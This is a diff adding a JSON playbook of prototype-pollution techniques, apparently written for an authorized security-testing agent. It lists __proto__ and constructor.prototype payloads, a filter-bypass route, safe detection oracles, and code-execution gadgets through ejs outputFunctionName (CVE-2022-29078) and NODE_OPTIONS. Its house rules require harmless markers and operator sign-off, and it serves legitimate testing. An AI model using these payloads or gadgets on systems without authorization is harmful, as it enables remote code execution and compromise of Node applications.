@@ -1,0 +1,177 @@
+{
+  "corpus": "PP",
+  "organ": "prototype-playbook",
+  "vuln_class": "prototype_pollution",
+  "corpus_version": "1.0.0",
+  "house_rules": [
+    "No-DoS law (organ doctrine, from Heyes' black-box detection research): every server-side probe below is a HARMLESS property write whose only footprint is an observable response difference - crash-style probes (polluting toString/valueOf on hot paths) are forbidden.",
+    "The hunting order is source -> gadget -> sink: a source alone is an informational FACT; the finding is the chain.",
+    "Payloads are canonical forms from the public record, attributed per entry.",
+    "failure_modes are mandatory reading BEFORE closing a hypothesis as negative: a probe that failed for a listed reason leaves the merge path untested, not safe."
+  ],
+  "entries": [
+    {
+      "id": "PP-001",
+      "technique": "query-string source (client-side / old parsers)",
+      "prerequisites": ["page parses query params into a deep object (old qs, jQuery deep extend era) and merges into a target object"],
+      "probe": "?__proto__[polluted]={{marker}}",
+      "oracle": "window.polluted or ({}).polluted === marker in the console check - a client-side FACT record; the finding needs a gadget that READS it",
+      "failure_modes": [
+        "modern query parsers flatten keys as literals (__proto__ becomes an own property named '__proto__' on the instance, not the prototype) - the sanitizer/parser is doing its job: FACT",
+        "Express 'query parser' set to 'simple' - bracket nesting not expanded; class closed at that app",
+        "client-side only relevance - hand the gadget hunt to the DOM sink classes (PP-009 boundary)"
+      ],
+      "source": {
+        "credit": "canonical client-side source class",
+        "title": "Exploit Notes - Prototype Pollution (server-side & client-side forms)",
+        "url": "https://exploitnotes.org/exploit/web/prototype-pollution-in-server-side.html"
+      }
+    },
+    {
+      "id": "PP-002",
+      "technique": "JSON body source + recursive merge (server-side)",
+      "prerequisites": ["Node backend merges JSON.parse'd user input into an options/defaults object (lodash _.merge era, jQuery extend, custom recursive merge)"],
+      "probe": "{\"__proto__\":{\"polluted\":\"{{marker}}\"}}",
+      "oracle": "the merge writes onto Object.prototype - detected via the safe oracles (PP-004..006); JSON.parse alone never pollutes (it builds a plain own-property), the MERGE is the bug",
+      "failure_modes": [
+        "lodash >= patched versions / Object.create(null) targets - merge is source-safe; version-pin the library as FACT",
+        "schema-validated bodies reject unknown keys - validation layer held",
+        "plain assignment sinks (obj[key]=value with flat key) need key='__proto__' as a STRING - different grammar, same class"
+      ],
+      "source": {
+        "credit": "canonical server-side source class",
+        "title": "Exploit Notes / OWASP literature on recursive-merge pollution",
+        "url": "https://exploitnotes.org/exploit/web/prototype-pollution-in-server-side.html"
+      }
+    },
+    {
+      "id": "PP-003",
+      "technique": "constructor.prototype bypass (when __proto__ is filtered)",
+      "prerequisites": ["sink blocks the literal __proto__ key but the merge still recurses"],
+      "probe": "?constructor[prototype][polluted]={{marker}} / {\"constructor\":{\"prototype\":{\"polluted\":\"{{marker}}\"}}}",
+      "oracle": "same pollution as PP-001/002 via the equivalent property path - proves the filter is lexical, not structural",
+      "failure_modes": [
+        "WAF/modsec rules now match both paths (coreruleset 934130 matches __proto__ AND constructor.prototype) - refusal at the edge; try JSON body vs query as separate routes",
+        "merge special-cases constructor as non-enumerable/own - modern hardening; FACT and move on"
+      ],
+      "source": {
+        "credit": "coreruleset project (filter-evasion documentation)",
+        "title": "OWASP CoreRuleSet issue 3415 - prototype pollution detection patterns",
+        "url": "https://github.com/coreruleset/coreruleset/issues/3415"
+      }
+    },
+    {
+      "id": "PP-004",
+      "technique": "safe detection - JSON reflection oracle",
+      "prerequisites": ["endpoint echoes its parsed JSON input back (API round-trip)"],
+      "probe": "POST {\"__proto__\":{\"json spaces\":\"  \",\"x\":\"{{marker}}\"}} then a normal POST and compare formatting/reflection",
+      "oracle": "a polluted property that alters JSON serialization (indentation/spacing, echoed keys) changes the SUBSEQUENT response without crashing anything - response differential = polluted, identical = not",
+      "failure_modes": [
+        "response built from a fresh serializer config per request - pollution not consulted; try the status-code oracle (PP-005)",
+        "reflection only of own properties - prototype reads invisible in that echo; move to header/CORS oracle (PP-006)"
+      ],
+      "source": {
+        "credit": "Gareth Heyes / PortSwigger Research",
+        "title": "Server-side prototype pollution: Black-box detection without the DoS (JSON-based techniques)",
+        "url": "https://portswigger.net/research/server-side-prototype-pollution-black-box-detection-without-the-dos"
+      }
+    },
+    {
+      "id": "PP-005",
+      "technique": "safe detection - status-code override oracle",
+      "prerequisites": ["framework whose error/status path consults object properties (Express-adjacent stacks)"],
+      "probe": "pollute {\"__proto__\":{\"status\":599}} (harmless, non-standard code) then trigger ANY normal request",
+      "oracle": "subsequent responses carry status 599 (or the polluted value in the response line) - the framework read Object.prototype.status as its default; reverse the probe immediately (status 200) to clean up",
+      "failure_modes": [
+        "framework pins status explicitly on every path - default never consulted",
+        "reverse-cleanup probe mandatory: leave the process CLEAN (organ's operator-respect rule), never 500-class values on shared infra"
+      ],
+      "source": {
+        "credit": "Gareth Heyes / PortSwigger Research",
+        "title": "Server-side prototype pollution: Black-box detection without the DoS",
+        "url": "https://portswigger.net/research/server-side-prototype-pollution-black-box-detection-without-the-dos"
+      }
+    },
+    {
+      "id": "PP-006",
+      "technique": "safe detection - CORS header reflection oracle",
+      "prerequisites": ["CORS middleware reads config (exposedHeaders etc.) from an options object"],
+      "probe": "pollute {\"__proto__\":{\"exposedHeaders\":[\"{{marker}}\"]}} then send a cross-origin-shaped OPTIONS/GET",
+      "oracle": "Access-Control-Expose-Headers grows the marker - the middleware's options lookup walked the prototype chain: pollution confirmed from OUTSIDE, no crash possible",
+      "failure_modes": [
+        "CORS config frozen at startup - per-request lookups absent; FACT and move to other gadget surfaces",
+        "no CORS surface on the route - pick routes with preflight handling"
+      ],
+      "source": {
+        "credit": "Gareth Heyes / PortSwigger Research",
+        "title": "Server-side prototype pollution: Black-box detection without the DoS (reflection techniques)",
+        "url": "https://portswigger.net/research/server-side-prototype-pollution-black-box-detection-without-the-dos"
+      }
+    },
+    {
+      "id": "PP-007",
+      "technique": "gadget - template engine code execution (ejs outputFunctionName)",
+      "prerequisites": ["confirmed pollution source on a Node app", "ejs render path reachable", "ejs version in the vulnerable range (CVE-2022-29078)"],
+      "probe": "pollute {\"__proto__\":{\"outputFunctionName\":\"a; global.marker='{{canary}}'; var b\"}} then trigger a render",
+      "oracle": "the canary lands in the rendered output/global scope - code execution WITHOUT a command payload first; escalate to impact only with operator authorization (R7) and bounded proofs",
+      "failure_modes": [
+        "ejs patched (post-CVE-2022-29078 versions validate the option) - version-pin the dependency tree as the FACT",
+        "render options passed as explicit object with the key set - own property shadows the prototype read",
+        "STOP at the canary: spawning processes is an operator decision, never an agent action (house rule)"
+      ],
+      "source": {
+        "credit": "CVE-2022-29078 (ejs prototype-pollution RCE, public record)",
+        "title": "NVD - CVE-2022-29078; gadget-chain analysis (aquilax writeup)",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29078"
+      }
+    },
+    {
+      "id": "PP-008",
+      "technique": "gadget class - child_process / env-option execution",
+      "prerequisites": ["confirmed pollution", "a code path that spawns child processes with an options object (NODE_OPTIONS-era gadgets)"],
+      "probe": "pollute env/argv-shaping keys (e.g. {\"__proto__\":{\"NODE_OPTIONS\":\"--require {{operator-module-path}}\"}}) and trigger the spawn",
+      "oracle": "spawned process loads the operator module (observable via operator-owned marker file/module side effect) - execution proven, payload stays a marker",
+      "failure_modes": [
+        "spawn calls pass explicit env - prototype default never read",
+        "NODE_OPTIONS ignored for the binary in use (some runtimes strip it)",
+        "module path must be operator-reachable on the HOST - without that, the chain is theoretical: record it as impact-limited, do not improvise downloads"
+      ],
+      "source": {
+        "credit": "Gareth Heyes / PortSwigger Research (gadget hunting discipline)",
+        "title": "Widespread prototype pollution gadgets (PortSwigger Research)",
+        "url": "https://portswigger.net/research/server-side-prototype-pollution-black-box-detection-without-the-dos"
+      }
+    },
+    {
+      "id": "PP-009",
+      "technique": "boundary entry - DOM clobbering hand-off",
+      "prerequisites": ["client-side object world, HTML named elements shadowing window globals"],
+      "probe": "<a id=someGlobal> style injections clobbering window lookups (full grammar lives in xss-playbook references/mxss-and-clobber.md)",
+      "oracle": "n/a here - this entry marks the ORGAN BOUNDARY: clobbering hunts continue in xss-playbook; only prototype-chain effects stay in this organ",
+      "failure_modes": [
+        "crossing the boundary silently duplicates the other organ's work - spine's one-organ-per-hypothesis rule"
+      ],
+      "source": {
+        "credit": "Gareth Heyes / Cure53 lineage split",
+        "title": "xss-playbook references/mxss-and-clobber.md (clobbering grammar)",
+        "url": "https://portswigger.net/research/server-side-prototype-pollution-black-box-detection-without-the-dos"
+      }
+    },
+    {
+      "id": "PP-010",
+      "technique": "the negative-space map (what a NON-finding looks like)",
+      "prerequisites": ["run after PP-001..006 to close a hypothesis honestly"],
+      "probe": "n/a - this entry enumerates the conditions that make 'no pollution' a REAL negative rather than an untested one",
+      "oracle": "a clean close requires ALL of: source reached (2xx + parsed), merge path version-pinned, constructor bypass tried (PP-003), at least two safe-detection oracles run (PP-004..006), and cleanup probes confirmed no residue",
+      "failure_modes": [
+        "closing after a single filtered probe - the most common false negative in this class; the bypass entry PP-003 exists exactly for that",
+        "server restarts between probe and oracle (serverless/per-worker pools) - pollution is per-process: pin the worker first (session affinity), or the oracle reads a fresh prototype"
+      ],
+      "source": {
+        "credit": "house doctrine (prototype-playbook + Heyes' safe-probe repertoire)",
+        "title": "prototype-playbook references/object-model-attacks.md (safe-probe repertoire)",
+        "url": "https://portswigger.net/research/server-side-prototype-pollution-black-box-detection-without-the-dos"
+      }
+    }
+  ]
+}
